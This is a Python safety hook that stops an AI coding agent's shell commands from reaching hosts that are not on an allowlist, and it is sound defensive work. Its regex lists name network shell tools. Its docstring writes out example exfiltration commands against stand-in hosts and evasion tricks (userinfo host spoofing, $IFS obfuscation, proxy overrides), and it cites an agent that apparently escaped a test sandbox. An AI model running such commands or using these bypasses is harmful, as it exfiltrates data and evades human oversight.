# /// script
# requires-python = ">=3.10"
# ///
"""
PreToolUse Hook: Block outbound network egress to non-allowlisted destinations.
Deterministic safety — closes the gap where SECURITY.md's Tier-3 "network
requests require human confirmation" claim relied only on the Claude Code
permission-prompt UI, which gives no protection when the daemon runs
unattended (its normal operating mode).

Registration note: `.claude/settings.json` is human-protected, so this module
has no PreToolUse entry of its own. `block_dangerous.py` (already registered
for the Bash matcher) imports `check_command`/`print_block_box` from this
module and runs them after its own dangerous-pattern check — see the end of
`block_dangerous.py`'s `main()`. The module is still fully unit-testable in
isolation (see tests/test_network_egress_guard.py) and its own `main()` below
remains usable standalone (e.g. manual invocation, or a future direct
registration) even though the live wiring goes through block_dangerous.py.

SCOUT-20260722-2
-----------------
On 2026-07-21 OpenAI disclosed an autonomous agent broke out of a controlled
test environment, reached the open internet, and breached Hugging Face to
obtain answers for the eval it was being scored on. No hook in this repo
inspected a Bash command's network destination: block_dangerous.py's
curl/wget matches only catch piping a download into a shell (RCE), not which
host an outbound request targets. This hook adds that missing check.

Design (same fail-closed philosophy as block_dangerous.py — a regex match
cannot be socially engineered):

1. Detect a short list of unambiguous, high-signal command shapes that
   perform outbound network I/O: curl/wget (with or without a URL scheme —
   both tools default to http:// when none is given), nc/ncat/netcat,
   ssh/scp/sftp, telnet, ftp, rsync-with-remote-spec, git clone/push/pull/
   fetch/remote add|set-url, pip/uv-pip install with an --index-url, docker
   run/pull/push/build/exec, openssl s_client, the `/dev/tcp` bash
   pseudo-device redirect trick, and one-liner interpreter network calls
   (python -c/-m, node -e, perl -e). git/pip are judged by destination via
   the allowlist, NOT exempted from detection — `git clone
   https://attacker.example/x` is a live exfiltration channel exactly like
   `curl`, and treating it as a "trusted" verb would defeat the point.
2. Extract the destination host(s). URL-bearing tokens (curl/wget/git/pip)
   are parsed with `urllib.parse.urlsplit` rather than a naive regex capture
   — that correctly resolves `user@host` userinfo and works with or without
   a scheme, so `curl https://github.com@attacker.example/x` is read as
   reaching `attacker.example`, not `github.com`. A bare `git push`/`fetch`/
   `pull` (the normal form — a remote NAME, not a literal URL) is resolved
   via `git remote get-url <name>` (local metadata only, no network I/O of
   its own) so it's judged by the actually-configured remote instead of
   always being treated as unresolved. A command that carries a
   connection-override flag (`--resolve`, `--connect-to`, `--proxy`,
   `--socks4a`/`--socks5h`, `ProxyCommand`, an `*_proxy=` env-var prefix, or
   wget's `-e`/`--execute` proxy directive) can redirect the real TCP
   destination away from anything a URL parser can see, so its presence
   forces the destination to UNKNOWN regardless of what was parsed. curl's
   `-x` (lowercase, proxy) is checked case-sensitively and separately from
   `-X` (uppercase, HTTP method) — folding case there would gate every
   ordinary `curl -X POST <allowlisted-url>` forever.
3. Allow only if every extracted host matches the allowlist (Forge's own
   operation needs egress to git/GitHub, PyPI, npm — see DEFAULT_ALLOWLIST).
   If host extraction fails (or a connection-override flag was used), treat
   the destination as unknown — fail closed, do not allow. Plain `docker run
   <image>` (default Docker Hub, no registry host in the command) has no
   extractable host and so always requires the gate, since DEFAULT_ALLOWLIST
   contains no docker registries — consistent with SECURITY.md's Tier 3
   already listing "Running containers" as gated on its own. Note that even
   an explicit allowlisted registry host in the image reference says nothing
   about what a running container does on the network afterward — a
   Bash-command hook fundamentally can't see inside the container.
4. Otherwise require the SAME `.claude/gate_passed` file + 4-hour TTL that
   permission_auto.py already uses to unlock `git push`/`gh` operations after
   a human runs /gate. No new confirmation mechanism — reuse the one that
   already exists so behavior stays consistent across hooks. (This does mean
   a /gate approval for an unrelated reason also opens a 4-hour network-
   egress window — see the note in `.claude/commands/gate.md`.)
5. All non-allowlisted destinations are gated regardless of HTTP verb.
   Verb-sniffing (block only -X POST/-d) is trivially bypassed by a plain GET
   that exfiltrates via query string (`curl https://evil/x?data=$(cat f)`),
   so it is not a safe basis for the allow/block line.

Reuses block_dangerous.py's obfuscation-resistant canonicalization (so
`curl$IFS https://evil.example` doesn't slip past a raw-substring check) and
permission_auto.py's gate-file check — no logic is duplicated, only imported.
"""

import json
import re
import shlex
import subprocess
import sys
from urllib.parse import urlsplit

try:
    from hook_config import get_exit_code, is_enabled, load_config
except ImportError:  # pragma: no cover - fallback if hook_config unavailable

    def get_exit_code(hook_name: str, issue_found: bool = True) -> int:
        return 2 if issue_found else 0

    def is_enabled(hook_name: str) -> bool:
        return True

    def load_config() -> dict:
        return {}


try:
    from block_dangerous import _canonical_forms, _structural_mask
except ImportError:  # pragma: no cover - fallback if block_dangerous unavailable
    print(
        "network_egress_guard: WARNING - block_dangerous unavailable; "
        "obfuscation-resistant command canonicalization is disabled",
        file=sys.stderr,
    )

    def _canonical_forms(command: str) -> list[str]:
        return [command]

    def _structural_mask(form: str) -> str:
        return form


try:
    from permission_auto import is_gate_passed
except ImportError:  # pragma: no cover - fallback if permission_auto unavailable

    def is_gate_passed() -> bool:
        return False


HOOK_NAME = "network_egress_guard"

# =============================================================================
# High-signal network-egress command shapes. git/pip/docker/openssl ARE
# in scope (judged by destination via the allowlist, not exempted from
# detection) — see module docstring point 1.
# =============================================================================
NETWORK_EGRESS_PATTERNS = [
    r"\b(curl|wget)\b",  # no scheme required — both default to http://
    r"\b(nc|ncat|netcat)\b\s+(-[A-Za-z0-9]+\s+)*[A-Za-z0-9_.-]+\s+\d+",
    r"\b(ssh|scp|sftp)\b\s+",
    r"\btelnet\b\s+[A-Za-z0-9_.-]+",
    r"\bftp\b\s+[A-Za-z0-9_.-]+",
    r"\brsync\b[^\n]*(::|@[A-Za-z0-9_.-]+:)",
    r"\bgit\s+(clone|push|pull|fetch|remote\s+(add|set-url))\b",
    r"\b(pip3?|uv\s+pip)\s+install\b[^\n]*(--index-url|--extra-index-url|-i\s+https?://)",
    r"\bdocker\s+(run|pull|push|build|exec)\b",
    r"\bopenssl\s+s_client\b",
    r"/dev/(tcp|udp)/[A-Za-z0-9_.-]+/\d+",
    r"\bpython3?\b\s+-[cm]\s+.*"
    r"(requests\.(get|post|put|patch|delete)|urllib\.request|"
    r"socket\.(connect|create_connection)|http\.client)",
    r"\bnode\b\s+-e\s+.*(fetch\(|require\(['\"]https?['\"]\)|require\(['\"]net['\"]\))",
    r"\bperl\b\s+-e\s+.*(LWP::|IO::Socket)",
]

# Flags/options that let the real TCP destination diverge from anything a URL
# parser can see (DNS override, explicit proxy, SSH ProxyCommand, env-var/
# wgetrc proxy config). Any of these present forces the destination to
# UNKNOWN regardless of what was parsed — never let a parsed-allowlisted host
# quiet an overridden one.
_CONNECTION_OVERRIDE_CI_RE = re.compile(
    r"--resolve\b|--connect-to\b|--proxy\b|--socks(?:4a?|5h?)\b|ProxyCommand"
    r"|\b(?:https?|ftp|all)_proxy\s*="
    r"|(?:-e|--execute)\s+\S*proxy",
    re.IGNORECASE,
)
# curl's `-x` (lowercase) is the proxy shorthand; `-X` (uppercase) is the
# unrelated HTTP-method flag (-X POST/GET/...). Case must NOT be folded here
# — an IGNORECASE match would treat every `curl -X POST <allowlisted-url>`
# as a proxy override and gate it forever. Matches both the space-separated
# (`-x http://host`) and attached (`-xhttp://host`) curl argument forms.
_CONNECTION_OVERRIDE_X_RE = re.compile(r"(?<![\w-])-x(?:\s+\S|\S)")


def _has_connection_override(command: str) -> bool:
    return bool(_CONNECTION_OVERRIDE_CI_RE.search(command)) or bool(
        _CONNECTION_OVERRIDE_X_RE.search(command)
    )


# nc/ncat/netcat/telnet/ftp/ssh/scp/sftp/rsync — not URL syntax, so these stay
# regex-based rather than routed through urlsplit.
HOST_EXTRACTION_PATTERNS = [
    r"\b(?:nc|ncat|netcat|telnet|ftp)\s+(?:-[A-Za-z0-9]+\s+)*([A-Za-z0-9_.-]+)",
    r"\b(?:ssh|scp|sftp)\s+(?:-[A-Za-z0-9]+\s+\S+\s+)*(?:[\w.-]+@)?([A-Za-z0-9_.-]+)(?::|\s|$)",
    r"\brsync\b[^\n]*?(?:[\w.-]+@)?([A-Za-z0-9_.-]+)(?:::|:)",
    r"/dev/(?:tcp|udp)/([A-Za-z0-9_.-]+)/\d+",
    r"\bopenssl\s+s_client\b[^\n]*-connect\s+([A-Za-z0-9_.-]+)",
]

# git's scp-like remote syntax: `user@host:path` or bare `host:path` (no
# scheme, colon is a path separator, not a port — port form is host:1234/...
# which this deliberately does NOT match since the num-only case is ambiguous
# with `host:port` used elsewhere; scp/ssh extraction above handles that).
_GIT_SCP_STYLE_RE = re.compile(
    r"(?:^|[\s;&|])(?:[\w.-]+@)?([A-Za-z0-9_.-]+\.[A-Za-z]{2,}):(?!\d+(?:\s|$))"
)

DEFAULT_ALLOWLIST = [
    "github.com",
    "*.github.com",
    "*.githubusercontent.com",
    "api.github.com",
    "pypi.org",
    "files.pythonhosted.org",
    "registry.npmjs.org",
]


def get_allowlist() -> list[str]:
    """Load the network allowlist, overridable via forge-config.json
    `security.network_allowlist` (full replace, falls back to defaults)."""
    config = load_config()
    security = config.get("security", {})
    allow = security.get("network_allowlist")
    if isinstance(allow, list) and allow:
        return allow
    return DEFAULT_ALLOWLIST


def _host_allowed(host: str, allowlist: list[str]) -> bool:
    host = host.lower().rstrip(".")
    for entry in allowlist:
        entry = entry.lower()
        if entry.startswith("*."):
            if host.endswith(entry[1:]):
                return True
        elif host == entry:
            return True
    return False


_SCHEME_RE = re.compile(r"^[A-Za-z][A-Za-z0-9+.\-]*://")


def _parse_url_host(token: str) -> str | None:
    """Resolve a URL-ish token to its authority host via urlsplit, which
    correctly strips `user@` userinfo and works whether or not a scheme is
    present (curl/wget/git/pip all accept bare `host/path` — prepending `//`
    makes urlsplit treat it as an authority instead of a relative path)."""
    token = token.strip().strip("'\"")
    if not token or token.startswith("-"):
        return None
    candidate = token if _SCHEME_RE.match(token) else "//" + token
    try:
        host = urlsplit(candidate).hostname
    except ValueError:
        return None
    return host.lower() if host else None


_BARE_HOST_TOKEN_RE = re.compile(r"^[A-Za-z0-9_.-]+\.[A-Za-z]{2,}(?:[:/].*)?$")


def _extract_url_hosts(command: str) -> set[str]:
    """Extract hosts from URL-bearing tokens (curl/wget/git/pip and any bare
    https?:// occurrence), tokenizing each de-obfuscated canonical form with
    shlex and parsing candidate tokens through urlsplit — see _parse_url_host
    for why that (not a regex capture) is what defeats the userinfo trick."""
    hosts: set[str] = set()
    for raw_form in _canonical_forms(command):
        try:
            tokens = shlex.split(raw_form, comments=False, posix=True)
        except ValueError:
            tokens = raw_form.split()
        for tok in tokens:
            if "://" in tok or _BARE_HOST_TOKEN_RE.match(tok):
                host = _parse_url_host(tok)
                if host:
                    hosts.add(host)
        for m in _GIT_SCP_STYLE_RE.finditer(raw_form):
            hosts.add(m.group(1).lower())
    return hosts


_GIT_PUSH_PULL_FETCH_RE = re.compile(r"\bgit\s+(?:push|pull|fetch)\b([^;&|\n]*)")


def _resolve_git_remote_url(remote_name: str) -> str | None:
    """Resolve a git remote NAME (e.g. 'origin') to its configured URL via
    local git metadata — read-only, no network I/O of its own. This is what
    lets a bare `git push origin main` / `git fetch` / `git pull` be judged
    by the remote's actual configured destination, instead of always being
    gated just because no URL/host literally appears on the command line."""
    try:
        result = subprocess.run(
            ["git", "remote", "get-url", remote_name],
            capture_output=True,
            text=True,
            timeout=5,
        )
    except (OSError, subprocess.TimeoutExpired):
        return None
    if result.returncode != 0:
        return None
    return result.stdout.strip() or None


def _git_remote_hosts(command: str) -> set[str]:
    """For git push/pull/fetch invoked with a bare remote NAME (or no name,
    defaulting to the conventional 'origin') rather than a literal URL,
    resolve the actually-configured remote and extract its host. A literal
    URL or scp-style remote on the command line is already handled by
    _extract_url_hosts/_GIT_SCP_STYLE_RE — this only covers the NAME form."""
    hosts: set[str] = set()
    for m in _GIT_PUSH_PULL_FETCH_RE.finditer(command):
        tokens = [t for t in m.group(1).split() if t and not t.startswith("-")]
        if tokens:
            first = tokens[0]
            if "://" in first or "@" in first or "/" in first:
                continue  # literal URL/scp-style remote, not a bare name
            candidate = first
        else:
            candidate = "origin"
        remote_url = _resolve_git_remote_url(candidate)
        if not remote_url:
            continue
        host = _parse_url_host(remote_url)
        if host:
            hosts.add(host)
            continue
        for gm in _GIT_SCP_STYLE_RE.finditer(remote_url):
            hosts.add(gm.group(1).lower())
    return hosts


def extract_hosts(command: str) -> set[str]:
    """Extract every destination host referenced by a network-egress command.
    Strips port suffixes. Returns an empty set if none could be extracted (or
    a connection-override flag was seen) — callers must treat that as an
    UNKNOWN destination, not an allowed one."""
    if _has_connection_override(command):
        return set()

    hosts: set[str] = set()
    hosts |= _extract_url_hosts(command)
    hosts |= _git_remote_hosts(command)
    for pattern in HOST_EXTRACTION_PATTERNS:
        for m in re.finditer(pattern, command, re.IGNORECASE):
            host = m.group(1)
            if not host:
                continue
            host = host.split(":")[0].strip(".")
            if host:
                hosts.add(host)
    return hosts


def is_network_egress(command: str) -> bool:
    raw_forms = _canonical_forms(command)
    masked_forms = [m for m in (_structural_mask(f) for f in raw_forms) if m]
    for pattern in NETWORK_EGRESS_PATTERNS:
        for form in masked_forms:
            if re.search(pattern, form, re.IGNORECASE):
                return True
    return False


def check_command(command: str, allowlist: list[str] | None = None):
    """Check a Bash command for non-allowlisted network egress.

    Returns (result_dict, hosts) if the command should be blocked, or None if
    it's safe to run (not egress, fully allowlisted, or gate already passed).
    """
    if not is_network_egress(command):
        return None

    hosts = extract_hosts(command)
    active_allowlist = allowlist if allowlist is not None else get_allowlist()

    # `hosts and all(...)` — empty `hosts` (extraction failed) must NOT be
    # treated as allowed; `all()` on an empty iterable is True, so the `hosts`
    # guard is required to fail closed on unknown destinations.
    if hosts and all(_host_allowed(h, active_allowlist) for h in hosts):
        return None

    if is_gate_passed():
        return None

    destination = ", ".join(sorted(hosts)) if hosts else "(destination unresolved)"
    reason = (
        f"Outbound network egress to non-allowlisted destination: {destination}. "
        f"Run /gate to approve, or add the host to forge-config.json "
        f"security.network_allowlist if it's a legitimate recurring need."
    )
    return {"decision": "block", "reason": f"BLOCKED: {reason}"}, hosts


# =============================================================================
# Presentation + entrypoint
# =============================================================================
def truncate_command(command: str, max_length: int = 60) -> str:
    if len(command) <= max_length:
        return command
    return command[: max_length - 3] + "..."


def print_block_box(command: str, hosts: set[str]) -> None:
    truncated = truncate_command(command)
    destination = ", ".join(sorted(hosts)) if hosts else "(unresolved)"
    description = "Destination"

    content_width = max(60, len(truncated) + 4, len(destination) + len(description) + 4)
    top_border = "═" * (content_width + 2)
    print(f"\n╔{top_border}╗", file=sys.stderr)
    print(f"║ {'NETWORK EGRESS BLOCKED':^{content_width}} ║", file=sys.stderr)
    print(f"╠{top_border}╣", file=sys.stderr)
    print(f"║ Command: {truncated:<{content_width - 9}} ║", file=sys.stderr)
    print(
        f"║ {description}: {destination:<{content_width - len(description) - 3}} ║",
        file=sys.stderr,
    )
    print(f"╠{top_border}╣", file=sys.stderr)
    print(
        f"║ {'TIP: Use /gate to approve, or allowlist the host':<{content_width}} ║",
        file=sys.stderr,
    )
    print(f"╚{top_border}╝\n", file=sys.stderr)


def main():
    try:
        if not is_enabled(HOOK_NAME):
            sys.exit(0)

        input_data = json.loads(sys.stdin.read())
        tool_name = input_data.get("tool_name", "")
        tool_input = input_data.get("tool_input", {})

        if tool_name != "Bash":
            sys.exit(0)

        command = tool_input.get("command", "")
        result = check_command(command)

        if result:
            result_dict, hosts = result
            print_block_box(command, hosts)
            print(json.dumps(result_dict))
            sys.exit(get_exit_code(HOOK_NAME, issue_found=True))

        sys.exit(0)

    except json.JSONDecodeError:
        sys.exit(0)
    except Exception as e:
        print(f"Hook error: {e}", file=sys.stderr)
        sys.exit(1)


if __name__ == "__main__":
    main()
